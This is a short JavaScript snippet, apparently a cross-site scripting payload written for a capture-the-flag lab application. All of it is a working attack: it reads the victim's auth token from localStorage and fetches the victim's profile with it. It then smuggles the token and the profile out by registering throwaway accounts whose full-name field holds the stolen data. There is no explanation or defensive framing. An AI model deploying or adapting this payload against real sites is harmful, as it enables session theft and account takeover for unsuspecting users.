(function () {
  var t = localStorage.getItem("token") || "NOTOKEN";

  function reg(uname, blob) {
    fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io/api/register", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: uname,
        password: "flag123",
        email: uname + "@x.com",
        full_name: String(blob).slice(0, 240)
      })
    });
  }

  reg("pe_tokA", "TOKA:" + t.slice(0, 230));
  reg("pe_tokB", "TOKB:" + t.slice(230));

  fetch("https://lab-1784736030322-iqkdwd.labs-app.bugforge.io/api/profile", {
    headers: {
      Authorization: "Bearer " + t
    }
  })
  .then(function (r) {
    return r.text();
  })
  .then(function (b) {
    reg("pe_prof", "PROF:" + b);
  });
})();
